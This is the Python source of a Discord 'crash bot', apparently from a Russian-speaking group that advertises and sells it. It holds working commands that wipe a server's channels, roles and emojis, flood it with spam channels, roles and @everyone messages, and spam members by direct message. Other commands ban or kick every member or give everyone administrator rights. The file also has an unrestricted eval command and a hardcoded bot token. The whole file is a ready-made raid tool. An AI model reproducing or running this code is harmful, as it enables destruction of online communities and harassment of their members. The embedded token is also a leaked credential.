# coding=utf-8
import discord
import time
import random
import asyncio
import os
import json
import keep_alive
import inspect
import datetime, time
from discord.ext import commands
import datetime
import threading
from discord import Permissions
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
from discord import client
from discord.ext import commands
from discord.utils import get
from threading import Thread
from time import sleep
import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
# мне похуй на технологии
# главное чтобы на моих телефонах можно было играть в клэш раял -Стив Жопс

keep_alive.keep_alive()



wl = [860923164167110656,949696224750080052]

intents = discord.Intents.all()
prefix = "of!"
bot = commands.Bot(command_prefix = 'of!', intents=intents)
bot.remove_command( 'help' )
black_list = json.load(open('black-list.json'))
bl_server = json.load(open('bl-server.json'))
ser_vers = json.load(open('servers.json'))

dev_ids = [483558478565343232, 467290739219496960,832986836019707904]
premium = [483558478565343232, 467290739219496960, 859707787708727326, 806536984775884891, 942820805165875250,832986836019707904]
#Системное



@bot.command()
@commands.cooldown(1, 300, commands.BucketType.user) 
async def crash(ctx):
	a = 0
	b = 0
	c = 0
	d = 0
	e = 0
	for x in ctx.guild.channels:
		a += 1
		try: await x.delete()
		except: pass
	for x in ctx.guild.roles:
		b += 1
		try: await x.delete()
		except: pass
	for x in ctx.guild.emojis:
		d += 1
		try: await x.delete()
		except: pass
	for x in range(100):
		await ctx.guild.create_text_channel(name="crash-by-jkcrashers")
		c += 1
	for x in range(100):
		e += 1
		await ctx.guild.create_role(name ="Crash by JKCrashers")
		guild = ctx.message.guild
		await guild.edit(name="Crash by JKCrashers")
            
      
  
#(f"`Новый сервер — {guild.name}/{guild.id}! Людей: {members}. Овнер: {guild.owner}/{guild.owner.id}`")
@bot.event
async def on_guild_channel_create(channel):
    if channel.name == "crash-by-jkcrashers":
      print("test")
      webhook = await channel.create_webhook(name = "Crash by JK Crashers")
    print("test2")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      print("test3")
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      print("test4")
      while True:
        try:
          await webhook.send("@everyone @here \n Вас крашнули, сервер с краш ботами: https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title='Привет котаны!) Данный сервер крашится ', description=f'**Хочешь крашить сервера?**<:emoji_76:858227935676858398> \n **Тогда тебе точно к нам!**<:rules:858227884496519209>\n `JKCrashers` __даст вам:__<:star:858227953916968960> \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n <:gazeta:858227900242853918>**Наши социальные сети** \n <:emoji_77:858227971847487509>`Дискорд сервер` [🔗Клик](https://discord.gg/c2P7kn6Edc) \n <:shit:858228038718193704>`Telegram канал` [🔗Клик](https://t.me/jkcrashers) \n<:emoji_79:858227998498095154>`Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x0059ff))
        except:
          pass

#@bot.event
#async def on_message(msg):
 # if not isinstance(msg.channel, discord.DMChannel):
  #  await bot.process_commands(msg)
   # if msg.author.bot:
    #  return
    #if msg.guild.id == 860145647076507648 or msg.author.id == bot.user.id:
     # return
    #log_channel = bot.get_channel(860145647076507648)
    #await log_channel.send(f"** Автор** - `<@{msg.author.id}>`:", embed = discord.Embed(title='Новое сообщение', description=f'`{msg.author}` **Пишет** \n **Сообщение:** \n `{msg.content}` \n ```Информация``` \n**Айди сервера:** `{msg.guild.id}`; \n **Айди автора:** `{msg.author.id}` \n **Айди канала:** `{msg.channel.id}` \n **Сам канал** <#{msg.channel.id}>', colour = 0xe7d804))



@bot.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У бота отсутствуют права: {' '.join(err.missing_perms)}\nВыдайте их ему для полного функционирования бота", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandOnCooldown):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У вас еще не прошел кулдаун на команду {ctx.command}\nПодождите еще {err.retry_after:.2f} сек", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandNotFound ):
        await ctx.send(embed = discord.Embed(description = f'** {ctx.author.name}, данной команды не существует.**', color=0x0c0c0c))
    elif isinstance( err, commands.MissingRequiredArgument ):
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"Нету аргумента", color=discord.Colour.from_rgb(255, 0, 0)))

@bot.command(name="eval")
async def _eval(ctx, *, command):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик -_-', colour = 0xf00a0a))
  res = eval(command)
  if inspect.isawaitable(res):
    await ctx.send(await res)
  else:
    await ctx.send(res)

@bot.command(brief = "private", description = "Создаёт приглашение, и отправляет его")
async def invite(ctx=None, id=None):
  g = client.get_guild(int(id))
  if not g: return await ctx.send('Сервер не найден')
  for x in g.text_channels:
      link = await x.create_invite(max_age=1, max_uses=10)
      link = str(link)
      await ctx.send(link)
      return link
      await ctx.send(f'Нет прав для создания инвайта ')

@bot.command()
async def bl(ctx, param, id: int):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик этого творения', colour = 0xf00a0a))
  if param == "add":
    black_list.append(id)
    await ctx.send(f"<@{id}> был добавлен в черный список бота", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  elif param == "remove":
    black_list.remove(id)
    await ctx.send(f"<@{id}> был убран из черного списка бота", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  with open('black-list.json', 'w') as f: json.dump(black_list, f)

@bot.command()
async def wl(ctx, param, id: int):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик этого творения', colour = 0xf00a0a))
  if param == "add":
    ser_vers.append(id)
    await ctx.send(f"Сервер с этим айди {id} был добавлен", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  elif param == "remove":
    ser_vers.remove(id)
    await ctx.send(f"Сервер с этим айди {id} был убран", embed = discord.Embed(title='✅', description=f'Хорошего дня!', colour = 0x0059ff))
  with open('servers.json', 'w') as f: json.dump(ser_vers, f)
@bot.command(
  aliases = ['сказать', 'Сказать', 'Say'])
async def say(ctx, *, msg: str = None):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик -_-', colour = 0xf00a0a))
  await ctx.send(embed = discord.Embed(description = msg))

@bot.command(
  aliases = ['Ping', 'пинг', 'Пинг'])
async def ping(ctx):
    if not ctx.author.id in dev_ids:
      return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик -_-', colour = 0xf00a0a))
    ping = bot.ws.latency
    message = await ctx.send('Пожалуйста, подождите. . .') # Переменная message с первоначальным сообщением
    await message.edit(embed = discord.Embed(title='Понг', description=f'`{ping * 1000:.0f}ms` :ping_pong:', colour = 0x0059ff))

@bot.command()
async def uptime(ctx):
  uptime = str(datetime.timedelta(seconds=int(round(time.time()-startTime))))
  await ctx.send(uptime)
  await ctx.send("", embed = discord.Embed(title=':point_up_2:Бот работает', description='', colour = 0x0059ff))

@bot.command()
async def help_owner(ctx):
		embed = discord.Embed(
			title = ':book: | Меню помощи для Разработчика',
			description = f'`{prefix}say` - **Сказать в embed** \n `{prefix}ping` - **Пинг бота** \n `{prefix}uptime` - **Посмотреть аптайм** \n `{prefix}eval` - **Eval** \n `{prefix}invite id` - **Получить инвайт на сервер по айди** \n `{prefix}bl` `add` or `remove` - **Добавить чела в чс или убрать чела из чс** \n `{prefix}wl` `add` or `remove` - **Добавить сервер в вайт-лист**',
			colour = 0x0059ff)
		embed.set_footer(
			text = 'Все права защищены | JKVlad#6053',
			icon_url = 'https://cdn.discordapp.com/avatars/483558478565343232/5c5a8740803b62d842d5a0b64ade2612.webp?size=1024')
		embed.set_thumbnail(
			url = 'https://cdn.discordapp.com/avatars/704967695036317777/961384e7fde6d107a479c8ee66b6ac42.webp?size=128')
		await ctx.message.add_reaction('✅')
		await ctx.send(embed=embed)
#Крашерские команды


@bot.command()
@commands.cooldown(1, 500, commands.BucketType.user) 
async def dmspam( ctx, member: discord.Member ):
    await ctx.channel.purge( limit = 1 )
    for s in range(120):
      await member.send("https://discord.gg/DnnCFrtxBk \n Сервер с краш ботом")

@bot.command()
@commands.cooldown(1, 200, commands.BucketType.user) 
async def channels(ctx):
    a = 0
    b = 0 
    embed = discord.Embed(
        title = 'Статистика о спаме каналами.',
        description = f'''Создано текстовых каналов: {a}.\nСоздано голосовых каналов: {b}.''',
        color = 0xffff00
    )
    await ctx.message.delete()
    for i in range(1,100):
        await ctx.guild.create_text_channel('crashed by JK crashers')
        a += 1
    for i in range(1,100):
        b += 1
        await ctx.guild.create_voice_channel('Crashed By JK crashers')
    await ctx.author.send(embed=embed)

@bot.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {bot.user}  https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot Юзеров')
  await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'of!help | гг by JK', url='https://www.twitch.tv/jktimosha'))
  global startTime
  startTime = time.time()

@bot.command()
async def help(ctx):
		embed = discord.Embed(
			title = ':book: | Меню помощи',
			description = f"`{prefix}help` **выведет эту команду** \n `{prefix}crash` **Автоматический краш сервера** `Кулдаун 500` \n `{prefix}nuke` **Удаление каналов, ролей и эмодзи** `Кулдаун 300`\n`{prefix}dmspam` **@пингчела Спам в лс** `Кулдаун 500`\n `{prefix}channels` **Спам каналами** `Кулдаун 200` \n`{prefix}delchannels` **Удаление всех каналов** `Кулдаун 200` \n `{prefix}roles` **Спам ролями** `Кулдаун 200` \n `{prefix}delroles` **Удаление всех ролей** `Кулдаун 200` \n `{prefix}admin_everyone` **Выдача всем админки** `Кулдаун 60 `\n `{prefix}admin` **Создаст и выдаст админку** `Кулдаун 60` \n `{prefix}delemoji` **Удаление всех эмодзи** `Кулдаун 140` \n `{prefix}spam` **Спам в один канал** `Кулдаун 140`\n `{prefix}spamall` **Спам во все каналы** `Кулдаун 200`\n`{prefix}intchannels` **<кол-во каналов> Спам определенным количеством каналов** `Кулдаун 300` \n `{prefix}introles` **<кол-во ролей>** `Кулдаун 300` \n**__👑КОМАНДЫ ДЛЯ ПРЕМИУМ👑__** \n **В КОМАНДАХ НЕТУ КУЛДАУНА** \n`{prefix}banall` **ЗАБАНИТ ВСЕХ** \n `{prefix}kickall` **КИКНУТЬ ВСЕХ**\n`{prefix}customchan` **<название каналов> Создаст 100 каналов с вашим названием**  \n`{prefix}customchanvoice` **<название войс-каналов> Cоздаст 100 войс-каналов с вашим названием**  \n`{prefix}customroles` **<название ролей>** \n`{prefix}customname` **<название сервера>** \n`{prefix}customspam` **<текст спама>** \n **ЧТОБЫ ПОЛУЧИТЬ ПРЕМИУМ ПИШИТЕ <@483558478565343232>** [Или зайдите на сервер](https://discord.gg/J5Zyf8REht) \n Премиум стоит `50р`, покупая премиум вы получаете: \n ```Бан и кик всех``` \n ```Спам своим текстом```\n ```Создание каналов и ролей своим текстом``` \n ```Корону в логах краша``` \n **__НИКАКОЙ РЕКЛАМЫ!__**",
			colour = 0x055dff)
		embed.set_footer(
			text = 'Все права защищены | JKtimosha#6666',
			icon_url = 'https://cdn.discordapp.com/avatars/483558478565343232/5c5a8740803b62d842d5a0b64ade2612.webp?size=1024')
		embed.set_thumbnail(
			url = 'https://cdn.discordapp.com/avatars/704967695036317777/961384e7fde6d107a479c8ee66b6ac42.webp?size=128')
		await ctx.message.add_reaction('✅')
		await ctx.send(embed=embed)	# Вывод пинга в консоль




@bot.command()
@commands.cooldown(1, 350, commands.BucketType.user) 
async def auto(ctx):
  a = 0
  b = 0
  c = 0
  d = 0
  e = 0
  f = 0

  if ctx.author.id in black_list:
    return await ctx.send("Вы в чёрном списке бота")
    
  for x in ctx.guild.channels:
    a += 1
    try: await x.delete()
    except: pass
    guild = ctx.message.guild
    await guild.edit(name='Crash by JK Crashers')
  for x in ctx.guild.roles:
    b += 1
    try: await x.delete()
    except: pass
  for x in ctx.guild.members:
    f += 1
    try: await x.edit(nick="https://discord.gg/c2P7kn6Edc / Crash BY JK")
    except: pass
  for x in ctx.guild.emojis:
    d += 1
    try: await x.delete()
    except: pass
  for x in range(100):
    await ctx.guild.create_text_channel(name="JK Crashers")
    c += 1
  for x in range(100):
    e += 1
    await ctx.guild.create_role(name ="crash by JK Crashers")
    #async with aiohttp.ClientSession() as session:
       # webhook = discord.Webhook.from_url(config.webhook_guilds_url, #adapter=discord.AsyncWebhookAdapter(session))
        #await webhook.send(embed=discord.Embed(
            #title="СЕРВЕР СВЕРХУ КРАШНУТ",
            #description=(
             #   f"**Удалено каналов:** `{a}`\n"
              #  f"**Удалено ролей:** `{b}` \n"
               # f"**Создано текстовых каналов:** `{c}`\n"
                #f"**Создано ролей:** `{e}` \n"
               # f"**Удалено эмодзи:** `{d}`||(Если 0, то их не было)|| \n"
               # f"**Изменено ников** `{f}` \n"
               # f"**__Инфо после краша__** \n"
               # f"**Участников**: `{ctx.guild.member_count}`\n"
               # f"**Ролей -** `{str(len(ctx.guild.roles))}` \n"
                #f"**Каналов - ** `{str(len(ctx.guild.channels))}` \n"
                #f"**Крашер** <@{ctx.author.id}> **Его айди** `{ctx.author.id}`\n"
                #f"**ID сервера**: `{ctx.guild.id}`\n"
            #),
            #color=discord.Color.blurple()
            #))

@bot.command()
@commands.cooldown(1, 60, commands.BucketType.user) 
async def admin_everyone(ctx):
    role = discord.utils.get(ctx.message.guild.roles, name = "@everyone")
    perms = discord.Permissions(administrator = True)
    await role.edit(permissions = perms)

@bot.command()
@commands.cooldown(1, 200, commands.BucketType.user) 
async def delchannels(ctx):
    await ctx.message.delete()
    failed = []
    counter = 0
    for channel in ctx.guild.channels: #собираем
        try:
            await channel.delete(reason="По просьбе") #удаляем
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    embed = discord.Embed(
        title = 'Статистика об удалении каналов.',
        description = f'''Было удалено {counter} каналов.''',
        color = 0xffff00
    )
    await ctx.author.send(embed=embed)

@bot.command()
@commands.cooldown(1, 200, commands.BucketType.user) 
async def delroles(ctx):
    await ctx.message.delete()
    deler = 0
    for role in ctx.guild.roles:
        try:
            await role.delete()
            deler += 1
        except:
            pass
    embed = discord.Embed(
        title = 'Статистика об удалении ролей.',
        description = f'''Удалено ролей: {deler}''',
        color = 0xffff00
    )
    await ctx.author.send(embed=embed)

@bot.command()
@commands.cooldown(1, 140, commands.BucketType.user) 
async def roles(ctx):
    await ctx.message.delete()
    roleses = 0
    embed = discord.Embed(
        title = 'Статистика о создании ролей.',
        description = f'''Ролей создано: {roleses}''',
        color = 0xffff00
    )
    for i in range(0,100):
        await ctx.guild.create_role(name = 'JK Crashers')
        roleses += 1
    await ctx.author.send(embed=embed)

@bot.command(pass_context=True)  # разрешаем передавать агрументы
@commands.cooldown(1, 60, commands.BucketType.user) 
async def admin(ctx):  # создаем асинхронную фунцию бота
    guild = ctx.guild
    perms = discord.Permissions(administrator=True) #права роли
    await guild.create_role(name="JK Admin", permissions=perms) #создаем роль
    
    role = discord.utils.get(ctx.guild.roles, name="JK Admin") #находим роль по имени
    user = ctx.message.author #находим юзера
    await user.add_roles(role) #добовляем роль

    await ctx.message.delete()

@bot.command()
async def kickall(ctx):
    for m in ctx.guild.members:
        try:
            await m.kick(reason="https://discord.gg/c2P7kn6Edc Сервер с краш ботом")
        except:
            pass


@bot.command()
async def banall(ctx):
    for m in ctx.guild.members:
        try:
            await m.ban(reason="https://discord.gg/c2P7kn6Edc Сервер с краш ботом")
        except:
            pass

@bot.command()
@commands.cooldown(1, 300, commands.BucketType.user) 
async def nuke(ctx):
  a = 0
  b = 0
  c = 0
  for x in ctx.guild.channels:
    a += 1
    try: await x.delete()
    except: pass
  for x in ctx.guild.roles:
    b += 1
    try: await x.delete()
    except: pass
  for x in ctx.guild.emojis:
    c += 1
    try: await x.delete()
    except: pass

@bot.command()
@commands.cooldown(1, 200, commands.BucketType.user) 
async def spamall(ctx):
  for a in range(200):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send("@everyone @here \n Ссылка на дискорд сервер с краш ботами https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title='Привет котаны!) Данный сервер крашится ботом Lavan-Premium', description=f'**Хочешь крашить сервера?** \n **Тогда тебе точно к нам!**\n `JK Crashers` __представляет:__ \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n **Наши социальные сети** \n `Дискорд сервер` [🔗Клик](https://discord.gg/c2P7kn6Edc) \n `Telegram канал` [🔗Клик](https://t.me/jktimosha) \n `Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x0e0101))
        except:
            continue
            
@bot.command()
@commands.cooldown(1, 140, commands.BucketType.user) 
async def delemoji(ctx):
	for emoji in ctx.guild.emojis:
	 await emoji.delete()

@bot.command(pass_context=True)
@commands.cooldown(1, 140, commands.BucketType.user) 
async def spam(ctx):
     for s in range(200):
      await ctx.send("@everyone @here \n Ссылка на дискорд сервер с краш ботами https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title='Привет котаны!) Данный сервер крашится ботом Lavan-Premium', description=f'**Хочешь крашить сервера?** \n **Тогда тебе точно к нам!**\n `JK Crashers` __представляет:__ \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n **Наши социальные сети** \n `Дискорд сервер` [🔗Клик](https://discord.gg/c2P7kn6Edc) \n `Telegram канал` [🔗Клик](https://t.me/jktimosha) \n `Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x0e0101))

#Количественные
@bot.command(pass_context=True)
@commands.cooldown(1, 300, commands.BucketType.user) 
async def intchannels(ctx, m):
    await ctx.message.delete()
    count1 = 0
    embed = discord.Embed(
        title = 'Статистика о создании ролей.',
        description = f'''Ролей создано: {count1}''',
        color = 0xffff00
    )
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_text_channel('Crash by JKcrashers')
        count1 += 1
        await ctx.author.send(embed=embed)

@bot.command(pass_context=True)
@commands.cooldown(1, 300, commands.BucketType.user) 
async def introles(ctx, m):
    await ctx.message.delete()
    count1 = 0
    embed = discord.Embed(
        title = 'Статистика о создании ролей.',
        description = f'''Ролей создано: {count1}''',
        color = 0xffff00
    )
    while count1 < int(m):
        guild = ctx.message.guild
        await guild.create_role(name = 'Crash by JKcrashers')
        count1 += 1
        await ctx.author.send(embed=embed)
#Кастомные
@bot.command()
async def customchan(ctx, *, arg):
  await ctx.send("Хорошо")
  for b in range(100):
   await ctx.guild.create_text_channel(arg)
@bot.command()
async def customroles(ctx, *, arg):
  await ctx.send("Хорошо")
  for b in range(100):
   await ctx.guild.create_role(arg)
@bot.command()
async def customchanvoice(ctx, *, arg):
  for b in range(100):
   await ctx.guild.create_voice_channel(arg)

@bot.command(pass_context=True)
async def customname(ctx, *, arg):
  await ctx.guild.edit(name=arg)
  embed = discord.Embed(
        title = 'Изменил название сервера.',
        description = f'''На `{arg}`''',
        color = 0xffff00
    )
  await ctx.author.send(embed=embed)

@bot.command(pass_context=True)
async def customspam(ctx, *, arg):
  for s in range(200):
    await ctx.send(arg)


bot.run("OTY4ODgyNjgyNTk3NjIxODMw.YmlUUA.gbUi-W0NoQRdHTo3SItVJZ1hPJE")
